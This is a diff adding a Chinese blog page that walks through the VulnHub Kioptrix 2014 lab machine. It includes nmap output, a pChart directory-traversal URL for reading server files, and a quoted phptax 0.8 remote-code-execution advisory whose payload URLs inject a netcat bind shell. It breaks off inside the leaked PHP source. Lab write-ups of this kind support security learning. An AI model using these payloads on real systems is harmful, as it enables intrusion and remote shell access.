@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kioptrix: 2014">
+<meta property="og:url" content="https://z9m8r8.github.io/2024/10/10/Kioptrix%202014/index.html">
+<meta property="og:site_name" content="Phantom&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-10-09T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-10-11T01:17:07.509Z">
+<meta property="article:author" content="Phantom">
+<meta property="article:tag" content="Vulnhub">
+<meta property="article:tag" content="信息收集">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="反弹 shell">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="pChart 2.1.3">
+<meta property="article:tag" content="phptax 0.8">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2024/10/10/Kioptrix%202014/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/10/10/Kioptrix%202014/","path":"2024/10/10/Kioptrix 2014/","title":"Kioptrix: 2014"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Kioptrix: 2014 | Phantom's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Phantom's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.1. 主机探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">1.2. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.3. Web 信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">2. 渗透攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-shell"><span class="nav-text">2.1. 获取 shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">2.2. 提权</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Phantom"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Phantom</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">173</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">156</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/10/10/Kioptrix%202014/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Phantom">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Phantom's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Kioptrix: 2014 | Phantom's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Kioptrix: 2014
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-10-10 00:00:00" itemprop="dateCreated datePublished" datetime="2024-10-10T00:00:00+08:00">2024-10-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-10-11 09:17:07" itemprop="dateModified" datetime="2024-10-11T09:17:07+08:00">2024-10-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.4k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>5 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>靶机：<a
+target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">Kioptrix: 2014
+(#5) ~ VulnHub</a></p>
+</blockquote>
+<h2 id="信息收集">1. 信息收集</h2>
+<h3 id="主机探测">1.1. 主机探测</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
+<p>靶机：192.168.159.3</p>
+<h3 id="端口扫描">1.2. 端口扫描</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># nmap -sS -sV 192.168.159.3 -p-  </span></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-08 02:38 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.3</span><br><span class="line">Host is up (0.00072s latency).</span><br><span class="line">Not shown: 65532 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE  SERVICE VERSION</span><br><span class="line">22/tcp   closed ssh</span><br><span class="line">80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/<span class="number">2.2</span>.<span class="number">21</span> OpenSSL/<span class="number">0.9</span>.<span class="number">8</span>q DAV/<span class="number">2</span> PHP/<span class="number">5.3</span>.<span class="number">8</span>)</span><br><span class="line"><span class="number">8080</span>/tcp open   http    Apache httpd <span class="number">2.2</span>.<span class="number">21</span> ((FreeBSD) mod_ssl/<span class="number">2.2</span>.<span class="number">21</span> OpenSSL/<span class="number">0.9</span>.<span class="number">8</span>q DAV/<span class="number">2</span> PHP/<span class="number">5.3</span>.<span class="number">8</span>)</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:C1:<span class="number">43</span>:A0 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">131.36</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="web-信息收集">1.3. Web 信息收集</h3>
+<p>80 源码提示 web 目录</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410092147655.jpg" /></p>
+<p>经查发现存在目录穿越漏洞</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/31173">pChart 2.1.3 -
+Multiple Vulnerabilities - PHP webapps Exploit</a></li>
+</ul>
+<p>测试</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410092147325.jpg" /></p>
+<p>8080 访问响应是 403 ，扫目录亦未得有效信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.3:8080/&quot;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --user-agent=<span class="string">&quot;Mozilla/4.0 Mozilla4_browser&quot;</span> -e php,txt,html -f -t 50 2&gt;&amp;/dev/null</span><br></pre></td></tr></table></figure>
+<p>根据操作系统是 FreeBSD，确定 apache 配置文件</p>
+<ul>
+<li><a
+target="_blank" rel="noopener" href="https://docs.freebsd.org/en/books/handbook/network-servers/#network-apache">Chapter
+32. Network Servers | FreeBSD Documentation Portal</a></li>
+</ul>
+<p>利用 80 的漏洞读取查看发现，仅允许 User-Agent 为
+<code>Mozilla/4.0</code> 的请求才能访问</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.3/pChart2.1.3/examples/index.php?Action=View&amp;Script=/usr/local/etc/apache22/httpd.conf</span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410092202765.jpg" /></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser</span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:8080&gt;</span><br><span class="line">    DocumentRoot /usr/local/www/apache22/data2</span><br><span class="line"></span><br><span class="line">&lt;Directory <span class="string">&quot;/usr/local/www/apache22/data2&quot;</span>&gt;</span><br><span class="line">    Options Indexes FollowSymLinks</span><br><span class="line">    AllowOverride All</span><br><span class="line">    Order allow,deny</span><br><span class="line">    Allow from <span class="built_in">env</span>=Mozilla4_browser</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
+<p>修改 <code>User-Agent: Mozilla/4.0 Mozilla4_browser</code> 访问</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202410101249442.jpg" /></p>
+<p>经查 phptax 0.8 存在RCE【<a
+target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/21665">phptax 0.8 - Remote
+Code Execution - PHP webapps Exploit</a>】</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------------------------</span><br><span class="line">phptax <span class="number">0</span>.<span class="number">8</span> &lt;= Remote Code Execution Vulnerability</span><br><span class="line">-----------------------------------------------------</span><br><span class="line"></span><br><span class="line">Discovered by: Jean Pascal Pereira &lt;pereira@secbiz.de&gt;</span><br><span class="line"></span><br><span class="line">Vendor information:</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;PhpTax is free software to do your U.S. income taxes. Tested under Unix environment.</span></span><br><span class="line"><span class="string">The program generates .pdfs that can be printed and sent to the IRS. See homepage for details and screenshot.&quot;</span></span><br><span class="line"></span><br><span class="line">Vendor URI: http:<span class="regexp">//s</span>ourceforge.net/projects/phptax/</span><br><span class="line"></span><br><span class="line">----------------------------------------------------</span><br><span class="line"></span><br><span class="line">Risk-level: High</span><br><span class="line"></span><br><span class="line">The application is prone to a remote code execution vulnerability.</span><br><span class="line"></span><br><span class="line">----------------------------------------------------</span><br><span class="line"></span><br><span class="line">drawimage.php, line <span class="number">63</span>:</span><br><span class="line"></span><br><span class="line">include (<span class="string">&quot;./files/$_GET[pfilez]&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> makes a png image</span><br><span class="line">$pfilef=str_replace(<span class="string">&quot;.tob&quot;</span>,<span class="string">&quot;.png&quot;</span>,$_GET[pfilez]);</span><br><span class="line">$pfilep=str_replace(<span class="string">&quot;.tob&quot;</span>,<span class="string">&quot;.pdf&quot;</span>,$_GET[pfilez]);</span><br><span class="line">Header(<span class="string">&quot;Content-type: image/png&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ($_GET[pdf] == <span class="string">&quot;&quot;</span>) Imagepng($image);</span><br><span class="line"><span class="keyword">if</span> ($_GET[pdf] == <span class="string">&quot;make&quot;</span>) Imagepng($image,<span class="string">&quot;./data/pdf/$pfilef&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ($_GET[pdf] == <span class="string">&quot;make&quot;</span>) <span class="keyword">exec</span>(<span class="string">&quot;convert ./data/pdf/$pfilef ./data/pdf/$pfilep&quot;</span>);</span><br><span class="line"></span><br><span class="line">----------------------------------------------------</span><br><span class="line"></span><br><span class="line">Exploit / Proof of Concept:</span><br><span class="line"></span><br><span class="line">Bindshell on port <span class="number">23235</span> using netcat:</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//l</span>ocalhost/phptax/drawimage.php?pfilez=xxx;%20nc%20-l%20-v%20-p%2023235%20-e%20/bin/bash;&amp;pdf=make</span><br><span class="line"></span><br><span class="line">** Exploit-DB Verified:**</span><br><span class="line">http:<span class="regexp">//l</span>ocalhost/phptax/index.php?pfilez=<span class="number">1040</span>d1-pg2.tob;nc%20-l%20-v%20-p%2023235%20-e%20/bin/bash;&amp;pdf=make</span><br><span class="line"></span><br><span class="line">----------------------------------------------------</span><br><span class="line"></span><br><span class="line">Solution:</span><br><span class="line"></span><br><span class="line">Do some input validation.</span><br><span class="line"></span><br><span class="line">----------------------------------------------------</span><br><span class="line">            </span><br></pre></td></tr></table></figure>
+<p>分析相关源码 drawimage.php，由于 80 存在目录穿越漏洞，可利用来读取
+drawimage.php【文件位置可由 Apache 配置文件推得】，示例</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.3/pChart2.1.3/examples/index.php?Action=View&amp;Script=/usr/local/www/apache22/data2/phptax/drawimage.php</span><br></pre></td></tr></table></figure>
+<p>drawimage.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// only 4 functions needed for images, the icondrawpng is the bomb!</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">line</span>(<span class="params"><span class="variable">$image</span>, <span class="variable">$u</span>, <span class="variable">$v</span>, <span class="variable">$scale</span>, <span class="variable">$x</span>, <span class="variable">$y</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="title function_ invoke__">ImageColorAllocate</span>(<span class="variable">$image</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$x</span>=<span class="variable">$x</span>*<span class="variable">$scale</span>;</span><br><span class="line">    <span class="variable">$u</span>=<span class="variable">$u</span>*<span class="variable">$scale</span>;</span><br><span class="line">    <span class="variable">$y</span>=<span class="variable">$y</span>*<span class="variable">$scale</span>;</span><br><span class="line">    <span class="variable">$v</span>=<span class="variable">$v</span>*<span class="variable">$scale</span>;</span><br><span class="line">    <span class="title function_ invoke__">Imageline</span>(<span class="variable">$image</span>,<span class="variable">$x</span>,<span class="variable">$y</span>,<span class="variable">$u</span>,<span class="variable">$v</span>,<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">Imageline</span>(<span class="variable">$image</span>,<span class="variable">$x</span>+<span class="number">1</span>,<span class="variable">$y</span>,<span class="variable">$u</span>+<span class="number">1</span>,<span class="variable">$v</span>,<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">Imageline</span>(<span class="variable">$image</span>,<span class="variable">$x</span>,<span class="variable">$y</span>+<span class="number">1</span>,<span class="variable">$u</span>,<span class="variable">$v</span>+<span class="number">1</span>,<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkbox</span>(<span class="params"><span class="variable">$image</span>, <span class="variable">$scale</span>, <span class="variable">$x</span>, <span class="variable">$y</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $edge = ImageColorAllocate($image,160,160,150);</span></span><br><span class="line">    <span class="variable">$padobe</span> = <span class="title function_ invoke__">ImageColorAllocate</span>(<span class="variable">$image</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$x</span> = <span class="variable">$x</span> * <span class="variable">$scale</span>;</span><br><span class="line">    <span class="variable">$y</span> = <span class="variable">$y</span> * <span class="variable">$scale</span>;</span><br><span class="line">    <span class="title function_ invoke__">ImageFilledRectangle</span>(<span class="variable">$image</span>,<span class="variable">$x</span>,<span class="variable">$y</span>,<span class="variable">$x</span>+<span class="variable">$scale</span>*<span class="number">.76</span>,<span class="variable">$y</span>+<span class="variable">$scale</span>*<span class="number">.76</span>,<span class="variable">$padobe</span>);</span><br><span class="line">    <span class="comment">// ImageRectangle($image,$x,$y,$x+$scale,$y+$scale,$edge);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tttext</span>(<span class="params"><span class="variable">$image</span>,<span class="variable">$dir</span>,<span class="variable">$acolor</span>,<span class="variable">$ttfont</span>,<span class="variable">$ttext</span>,<span class="variable">$fontsize</span>,<span class="variable">$scale</span>,<span class="variable">$x</span>,<span class="variable">$y</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$red</span>  = <span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$acolor</span>,<span class="number">0</span>,<span class="number">2</span>));</span><br><span class="line">    <span class="variable">$grn</span>  = <span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$acolor</span>,<span class="number">2</span>,<span class="number">2</span>));</span><br><span class="line">    <span class="variable">$blu</span>  = <span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$acolor</span>,<span class="number">4</span>,<span class="number">2</span>));</span><br><span class="line">    <span class="variable">$zz</span> = <span class="title function_ invoke__">ImageColorAllocate</span>(<span class="variable">$image</span>,<span class="variable">$red</span>,<span class="variable">$grn</span>,<span class="variable">$blu</span>);</span><br><span class="line">    <span class="variable">$ttfont</span>=<span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;/ttf/<span class="subst">$ttfont</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$fontsize</span>=<span class="variable">$fontsize</span>*<span class="variable">$scale</span>/<span class="number">10</span>;</span><br><span class="line">    <span class="title function_ invoke__">Imagettftext</span>(<span class="variable">$image</span>,<span 